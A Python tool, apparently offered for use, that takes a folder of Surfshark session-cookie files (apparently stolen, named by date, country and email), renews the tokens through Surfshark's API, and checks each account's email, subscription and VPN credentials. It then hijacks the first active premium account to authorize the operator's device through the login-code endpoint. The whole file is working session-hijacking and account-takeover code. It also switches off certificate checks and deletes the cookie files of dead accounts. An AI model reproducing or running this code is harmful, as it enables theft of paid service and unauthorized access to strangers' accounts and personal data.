"""
╔══════════════════════════════════════════════════════════════════╗
║           SURFSHARK AUTO-LOGIN BOT (ACTIVE PREMIUM ONLY)       ║
║           Built with ❤️ by Momo                                ║
║           Strict Active Subscription Filter                    ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import json
import requests
import glob
import random
import base64
import time
import logging
from datetime import datetime
from typing import Dict, Optional, Tuple, List

requests.packages.urllib3.disable_warnings()

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════

CONFIG_FILE = "config.json"
TOKENS_FILE = "surfshark_tokens.txt"
CREDS_FILE = "vpn_credentials.txt"
LOG_FILE = "surfshark_bot.log"
WORKING_DIR = os.path.dirname(os.path.abspath(__file__))

USER_AGENTS = [
    "Surfshark/4.1.2 (com.surfshark.vpnclient.ios; build:4; iOS 26.1.0) Alamofire/5.10.2 device/mobile",
    "Surfshark/3.8.0 (com.surfshark.vpnclient.android; build:3; Android 14) okhttp/4.12.0",
    "Surfshark/4.5.0 (Windows NT 10.0; Win64; x64) SurfsharkService/4.5.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

API_BASE = "https://api.surfshark.com"

# ═══════════════════════════════════════════════════════════════
# ANSI COLORS
# ═══════════════════════════════════════════════════════════════

class C:
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    WHITE   = "\033[97m"
    BG_RED  = "\033[41m"
    BG_GREEN= "\033[42m"

    @staticmethod
    def enable_windows():
        if os.name == 'nt':
            try:
                import ctypes
                kernel32 = ctypes.windll.kernel32
                kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            except Exception:
                pass

C.enable_windows()

# ═══════════════════════════════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(os.path.join(WORKING_DIR, LOG_FILE), encoding='utf-8'),
    ]
)
logger = logging.getLogger("SurfsharkBot")

def log(msg: str, level: str = "info"):
    clean = re.sub(r'\033\[[0-9;]*m', '', msg)
    getattr(logger, level, logger.info)(clean)

def banner():
    print(f"""
{C.CYAN}{C.BOLD}╔══════════════════════════════════════════════════════════════════╗
║  {C.WHITE}███████╗██╗   ██╗██████╗ ███████╗███████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗{C.CYAN}
║  {C.WHITE}██╔════╝██║   ██║██╔══██╗██╔════╝██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝{C.CYAN}
║  {C.WHITE}███████╗██║   ██║██████╔╝█████╗  ███████╗███████║███████║██████╔╝█████╔╝ {C.CYAN}
║  {C.WHITE}╚════██║██║   ██║██╔══██╗██╔══╝  ╚════██║██╔══██║██╔══██║██╔══██╗██╔═██╗ {C.CYAN}
║  {C.WHITE}███████║╚██████╔╝██║  ██║██║     ███████║██║  ██║██║  ██║██║  ██║██║  ██╗{C.CYAN}
║  {C.WHITE}╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝{C.CYAN}
║                                                                  ║
║  {C.YELLOW}⚡ STRICT ACTIVE PREMIUM VERIFIER{C.CYAN}       {C.DIM}Built by Momo ❤️{C.RESET}{C.CYAN}        ║
║  {C.MAGENTA}🗑️ AUTO-DELETES EXPIRED & DEAD COOKIES{C.CYAN}                            ║
╚══════════════════════════════════════════════════════════════════╝{C.RESET}
""")

def print_status(icon, msg, color=C.WHITE, indent=3):
    print(f"{' ' * indent}{icon} {color}{msg}{C.RESET}")

def print_success(msg, indent=3):
    print_status("✅", msg, C.GREEN, indent)

def print_error(msg, indent=3):
    print_status("❌", msg, C.RED, indent)

def print_warn(msg, indent=3):
    print_status("⚠️", msg, C.YELLOW, indent)

def print_info(msg, indent=3):
    print_status("ℹ️", msg, C.CYAN, indent)

# ═══════════════════════════════════════════════════════════════
# COOKIE PARSER
# ═══════════════════════════════════════════════════════════════

class CookieParser:
    @staticmethod
    def extract_token(content: str, token_name: str) -> Optional[str]:
        for line in content.split('\n'):
            line = line.strip()
            if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')):
                continue
            clean = line[10:] if line.startswith('#HttpOnly_') else line
            if token_name in clean:
                parts = clean.split('\t')
                for i, part in enumerate(parts):
                    if part.strip() == token_name and i + 1 < len(parts):
                        val = parts[i + 1].strip()
                        if val and val.count('.') >= 2:
                            return val

        m = re.search(rf'"{token_name}"\s*:\s*"([^"]+)"', content)
        if m and m.group(1).count('.') >= 2:
            return m.group(1)

        m = re.search(rf'{token_name}\s*=\s*([^\s;,]+)', content)
        if m:
            val = m.group(1).strip('"\'')
            if val.count('.') >= 2:
                return val

        if token_name in content:
            m = re.search(
                rf'{token_name}[=\s\t]+\s*(eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+)',
                content
            )
            if m:
                return m.group(1)

        return None

    @staticmethod
    def extract_all_cookies(content: str) -> Dict[str, str]:
        cookies = {}
        for line in content.split('\n'):
            line = line.strip()
            if not line:
                continue
            clean = line[10:] if line.startswith('#HttpOnly_') else line
            if line.startswith('#') and not line.startswith('#HttpOnly_'):
                continue

            if '\t' in clean:
                parts = clean.split('\t')
                if len(parts) >= 7:
                    cookies[parts[5].strip()] = parts[6].strip()
            elif '=' in clean and not clean.startswith('–') and not clean.startswith('http'):
                key, _, val = clean.partition('=')
                key, val = key.strip(), val.strip().rstrip(';')
                if key and val and ' ' not in key:
                    cookies[key] = val
        return cookies

# ═══════════════════════════════════════════════════════════════
# SURFSHARK API CLIENT
# ═══════════════════════════════════════════════════════════════

class SurfsharkAPI:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False

    def renew_token(self, ssrtk: str) -> Optional[Dict]:
        url = f"{API_BASE}/v1/auth/renew"
        headers = {
            "Content-Type": "application/json;charset=utf-8",
            "Accept": "application/json",
            "User-Agent": USER_AGENTS[0],
            "Authorization": f"Bearer {ssrtk}",
        }
        try:
            r = self.session.post(url, json={}, headers=headers, timeout=12)
            if r.status_code == 200:
                data = r.json()
                t = data.get("token")
                if t:
                    return {'sstk': t, 'ssrtk': data.get("renewToken") or ssrtk}
        except Exception as e:
            log(f"Renew error: {e}", "error")
        return None

    def get_user_info(self, token: str) -> Optional[Dict]:
        url = f"{API_BASE}/v2/account/users/me"
        headers = {
            "Accept": "application/json",
            "User-Agent": USER_AGENTS[0],
            "Authorization": f"Bearer {token}",
        }
        try:
            r = self.session.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def get_subscription(self, token: str) -> Optional[Dict]:
        url = f"{API_BASE}/v1/payment/subscriptions/current"
        headers = {
            "Accept": "application/json",
            "User-Agent": USER_AGENTS[0],
            "Authorization": f"Bearer {token}",
        }
        try:
            r = self.session.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def get_vpn_credentials(self, token: str) -> Optional[Dict]:
        url = f"{API_BASE}/v1/server/credentials"
        headers = {
            "Accept": "application/json",
            "User-Agent": USER_AGENTS[0],
            "Authorization": f"Bearer {token}",
        }
        try:
            r = self.session.get(url, headers=headers, timeout=10)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return None

    def authorize_device(self, code: str, cookies: Dict, token: str = None) -> Tuple[bool, str]:
        code = code.upper().strip()

        # Method 1: api.surfshark.com with Bearer token
        if token:
            try:
                headers = {
                    "Content-Type": "application/json;charset=utf-8",
                    "Accept": "application/json",
                    "User-Agent": USER_AGENTS[0],
                    "Authorization": f"Bearer {token}",
                }
                r = self.session.post(
                    f"{API_BASE}/v1/account/authorization/assign",
                    json={"code": code},
                    headers=headers,
                    timeout=15,
                )
                if r.status_code == 200:
                    return True, "Authorized via API Bearer token"
            except Exception as e:
                log(f"API assign error: {e}", "warning")

        # Method 2: my.surfshark.com with updated _sstk cookie
        if cookies:
            if token:
                cookies['_sstk'] = token
            cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
            headers = {
                "Content-Type": "application/json;charset=utf-8",
                "Accept": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "Cookie": cookie_str,
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://my.surfshark.com",
                "Referer": "https://my.surfshark.com/account/login-code",
            }
            try:
                r = self.session.post(
                    "https://my.surfshark.com/account/p_api/v1/account/authorization/assign",
                    json={"code": code},
                    headers=headers,
                    timeout=15,
                )
                if r.status_code == 200:
                    return True, "Authorized via Web Cookies"
                elif r.status_code == 404:
                    return False, "Code not found or expired on Surfshark server. Check your device screen!"
                else:
                    return False, f"Server returned status {r.status_code}"
            except Exception as e:
                return False, str(e)

        return False, "Authorization failed"

# ═══════════════════════════════════════════════════════════════
# STRICT ACTIVE CHECKER
# ═══════════════════════════════════════════════════════════════

class ActiveChecker:
    @staticmethod
    def is_subscription_truly_active(sub_data: Optional[Dict], user_data: Optional[Dict], creds_data: Optional[Dict]) -> Tuple[bool, str]:
        """
        Strict check: Returns (is_active, reason_description)
        A subscription is ONLY active if:
        1. status is 'active' or 'active_grace'
        2. AND type is NOT 'trial_expired'
        3. AND status is NOT 'canceled' or 'expired'
        4. OR user has direct active VPN credentials.
        """
        if not sub_data or not isinstance(sub_data, dict):
            return False, "No subscription object returned (HTTP 204 / Free account)"

        status = str(sub_data.get('status', 'unknown')).lower()
        sub_type = str(sub_data.get('type', '')).lower()
        active_trial = sub_data.get('activeTrial', False)
        plan_name = sub_data.get('name', 'Unknown')
        expires_at = sub_data.get('expiresAt', '')

        # 1. Definite negative indicators
        if status in ['canceled', 'cancelled']:
            return False, f"Status is '{status}' (Subscription was canceled)"

        if status in ['expired', 'inactive']:
            return False, f"Status is '{status}' (Subscription expired)"

        if sub_type in ['trial_expired']:
            return False, f"Type is '{sub_type}' (Free trial period ended)"

        if 'free' in plan_name.lower():
            return False, f"Plan is Free tier ('{plan_name}')"

        # Check expiration date
        if expires_at:
            try:
                clean_exp = expires_at.replace('Z', '').split('+')[0].split('.')[0]
                exp_dt = datetime.fromisoformat(clean_exp) if 'T' in clean_exp else datetime.strptime(clean_exp[:10], '%Y-%m-%d')
                if exp_dt < datetime.now():
                    return False, f"Expired on {exp_dt.strftime('%Y-%m-%d')} (Past date)"
            except Exception:
                pass

        # 2. Positive indicators
        if status in ['active', 'active_grace']:
            return True, f"Active subscription ({status})"

        # Check if VPN credentials are functional
        if creds_data and isinstance(creds_data, dict) and creds_data.get('username'):
            return True, "Active VPN credentials available"

        # Check userServices in user_data
        if user_data and user_data.get('userServices'):
            services = user_data.get('userServices')
            if len(services) > 0:
                return True, f"Active user services: {services}"

        return False, f"Status is '{status}' (Not an active premium plan)"

# ═══════════════════════════════════════════════════════════════
# MAIN BOT ENGINE
# ═══════════════════════════════════════════════════════════════

class SurfsharkAutoLogin:
    def __init__(self, auto_delete: bool = True):
        self.cookies_folder = "cookies"
        self.auto_delete = auto_delete
        self.api = SurfsharkAPI()

    def delete_cookie_file(self, filepath: str, reason: str = "") -> bool:
        if not self.auto_delete:
            return False
        filename = os.path.basename(filepath)
        try:
            if os.path.exists(filepath):
                os.remove(filepath)
                print_status("🗑️", f"Auto-deleted: {filename} ({reason})", C.MAGENTA, indent=3)
                log(f"Auto-deleted expired cookie: {filename} - {reason}")
                return True
        except Exception as e:
            print_warn(f"Failed to auto-delete {filename}: {e}", indent=3)
        return False

    def load_cookie_files(self) -> List[str]:
        if not os.path.exists(self.cookies_folder):
            os.makedirs(self.cookies_folder, exist_ok=True)
            print_error(f"Folder '{self.cookies_folder}' not found. Created empty folder.")
            return []
        files = glob.glob(os.path.join(self.cookies_folder, "*.txt"))
        return files

    def update_cookie_file(self, filepath: str, new_sstk: str, new_ssrtk: str = None) -> bool:
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            content = re.sub(r'(_sstk\t)([^\t\n]+)', rf'\g<1>{new_sstk}', content)
            if new_ssrtk:
                content = re.sub(r'(_ssrtk\t)([^\t\n]+)', rf'\g<1>{new_ssrtk}', content)
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(content)
            return True
        except Exception:
            return False

    def scan_cookies(self) -> Tuple[Optional[Dict], List[Dict]]:
        cookie_files = self.load_cookie_files()
        if not cookie_files:
            print_warn(f"Folder '{self.cookies_folder}' is currently empty (all expired cookies were cleaned)!")
            return None, []

        print_info(f"Scanning {len(cookie_files)} cookie files for ACTIVE subscription...\n")

        active_account = None
        all_results = []

        for i, filepath in enumerate(cookie_files, 1):
            filename = os.path.basename(filepath)
            print(f"{C.CYAN}{'─'*62}{C.RESET}")
            print(f"[{i}/{len(cookie_files)}] 📁 {C.WHITE}{filename}{C.RESET}")

            try:
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
            except Exception as e:
                print_error(f"Cannot read file: {e}")
                self.delete_cookie_file(filepath, f"Read error: {e}")
                all_results.append({'filename': filename, 'email': 'Unknown', 'status': 'Error', 'reason': str(e)})
                continue

            sstk = CookieParser.extract_token(content, '_sstk')
            ssrtk = CookieParser.extract_token(content, '_ssrtk')

            if not sstk or not ssrtk:
                print_error("Missing tokens (_sstk or _ssrtk)")
                self.delete_cookie_file(filepath, "Missing tokens")
                all_results.append({'filename': filename, 'email': 'Unknown', 'status': 'Corrupt', 'reason': 'Missing tokens'})
                continue

            # Revive token
            revived = self.api.renew_token(ssrtk)
            if not revived:
                print_error("Token revive FAILED (Renew token revoked by Surfshark)")
                self.delete_cookie_file(filepath, "Renew token revoked")
                all_results.append({'filename': filename, 'email': 'Unknown', 'status': 'Revoked', 'reason': 'Renew token revoked'})
                continue

            new_sstk = revived['sstk']
            new_ssrtk = revived.get('ssrtk', ssrtk)
            self.update_cookie_file(filepath, new_sstk, new_ssrtk)

            # Check user info
            user = self.api.get_user_info(new_sstk)
            if not user:
                print_error("Token was rejected by user API")
                self.delete_cookie_file(filepath, "Token dead")
                all_results.append({'filename': filename, 'email': 'Unknown', 'status': 'Dead', 'reason': 'Token dead'})
                continue

            email = user.get('email', 'Unknown')
            print_success(f"Token live! Email: {C.CYAN}{email}{C.RESET}")

            # Fetch subscription & creds
            sub = self.api.get_subscription(new_sstk)
            creds = self.api.get_vpn_credentials(new_sstk)

            plan = sub.get('name', 'No active plan') if sub else 'None'
            status_raw = sub.get('status', 'None') if sub else 'None'
            sub_type = sub.get('type', '') if sub else ''
            expires = sub.get('expiresAt', 'N/A') if sub else 'N/A'

            # ── STRICT ACTIVE CHECK ──
            is_truly_active, reason = ActiveChecker.is_subscription_truly_active(sub, user, creds)

            if is_truly_active:
                print(f"\n   {C.BG_GREEN}{C.WHITE}{C.BOLD} ★★★ ACTIVE PREMIUM ACCOUNT FOUND! ★★★ {C.RESET}")
                print(f"   {C.GREEN}📧 Email:   {C.WHITE}{email}{C.RESET}")
                print(f"   {C.GREEN}📋 Plan:    {C.WHITE}{plan}{C.RESET}")
                print(f"   {C.GREEN}🟢 Status:  {C.WHITE}{status_raw}{C.RESET}")
                print(f"   {C.GREEN}📅 Expires: {C.WHITE}{expires}{C.RESET}")

                active_account = {
                    'filepath': filepath,
                    'email': email,
                    'plan': plan,
                    'status': status_raw,
                    'expires': expires,
                    'token': new_sstk,
                    'renew': new_ssrtk,
                    'cookies_dict': CookieParser.extract_all_cookies(content),
                }
                all_results.append({'filename': filename, 'email': email, 'status': 'ACTIVE', 'reason': reason})
                break
            else:
                print_error(f"NOT ACTIVE ➔ {reason}")
                self.delete_cookie_file(filepath, reason)
                print_status("⏭️", f"Skipping (Only ACTIVE subscriptions allowed)", C.DIM)
                all_results.append({'filename': filename, 'email': email, 'status': status_raw, 'reason': reason})

        return active_account, all_results

    def run(self):
        banner()

        while True:
            active_account, results = self.scan_cookies()

            if active_account:
                # We have a genuinely active subscription!
                self.authorize_flow(active_account)
                return

            # If no active account found:
            print(f"\n{C.RED}{'='*62}")
            print("❌ NO ACTIVE PREMIUM ACCOUNT FOUND!")
            print(f"{'='*62}{C.RESET}")

            if results:
                print(f"\n{C.BOLD}📊 Scan Results of Current Cookies:{C.RESET}")
                print(f"   {C.DIM}{'Email':<32} {'Status':<12} {'Why Rejected':<25}{C.RESET}")
                print(f"   {C.DIM}{'─'*32} {'─'*12} {'─'*25}{C.RESET}")
                for r in results:
                    color = C.RED if r['status'] != 'ACTIVE' else C.GREEN
                    print(f"   {r['email']:<32} {color}{r['status']:<12}{C.RESET} {r['reason']:<25}")

            print(f"""
{C.YELLOW}💡 Reason:{C.RESET}
   Aapke cookies folder ke sabhi accounts ka subscription expired ya
   canceled (trial khatam) ho chuka hai. Isliye app mein connect nahi ho pata.

{C.CYAN}👉 Solution:{C.RESET}
   1. Naya/Fresh active subscription wala cookie file '{self.cookies_folder}/' folder me daalo.
   2. Cookie file format: [Date] [Country] [email].txt
""")
            choice = input(f"{C.YELLOW}Press [Enter] to re-scan after adding new cookies (or 'q' to quit): {C.RESET}").strip()
            if choice.lower() == 'q':
                print(f"\n{C.MAGENTA}👋 Goodbye!{C.RESET}\n")
                return
            print("\n🔄 Re-scanning cookies folder...\n")

    def authorize_flow(self, account: Dict):
        print(f"\n{C.GREEN}{'='*62}")
        print("📱 DEVICE LOGIN (SURFSHARK APP)")
        print(f"{'='*62}{C.RESET}")
        print(f"   {C.WHITE}1.{C.RESET} Open Surfshark app on your Phone, TV, or PC")
        print(f"   {C.WHITE}2.{C.RESET} Click {C.CYAN}'Log in with code'{C.RESET} / {C.CYAN}'Login on another device'{C.RESET}")
        print(f"   {C.WHITE}3.{C.RESET} Enter the 6-digit code shown on your device screen:")
        print(f"{C.GREEN}{'='*62}{C.RESET}")

        max_attempts = 5
        attempt = 0

        while attempt < max_attempts:
            attempt += 1
            try:
                code = input(f"\n{C.YELLOW}🔑 Enter 6-digit code [attempt {attempt}/{max_attempts}]: {C.RESET}").strip()
            except (EOFError, KeyboardInterrupt):
                print(f"\n\n{C.MAGENTA}👋 Canceled by user.{C.RESET}")
                return

            if not code or len(code) != 6:
                print_error("Code must be exactly 6 characters (e.g. 123456)")
                continue

            print_status("⏳", "Authorizing device with ACTIVE subscription...", C.CYAN)
            success, message = self.api.authorize_device(
                code,
                account['cookies_dict'],
                account['token']
            )

            if success:
                print(f"\n{C.BG_GREEN}{C.WHITE}{C.BOLD} 🎉 DEVICE AUTHORIZED SUCCESSFULLY! {C.RESET}")
                print(f"   {C.GREEN}📧 Account:  {C.WHITE}{account['email']}{C.RESET}")
                print(f"   {C.GREEN}📋 Plan:     {C.WHITE}{account['plan']}{C.RESET}")
                print(f"   {C.GREEN}📅 Expires:  {C.WHITE}{account['expires']}{C.RESET}")
                print(f"\n🚀 Check your device — VPN is now fully connected & ready to use!\n")
                return
            else:
                print_error(f"Authorization failed: {message}")
                if attempt < max_attempts:
                    print_info("Make sure the 6-digit code is still active on your screen and try again.")

        print_error("Maximum attempts reached.")

def main():
    try:
        app = SurfsharkAutoLogin()
        app.run()
    except KeyboardInterrupt:
        print(f"\n\n{C.MAGENTA}👋 Goodbye!{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}❌ Error: {e}{C.RESET}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    main()
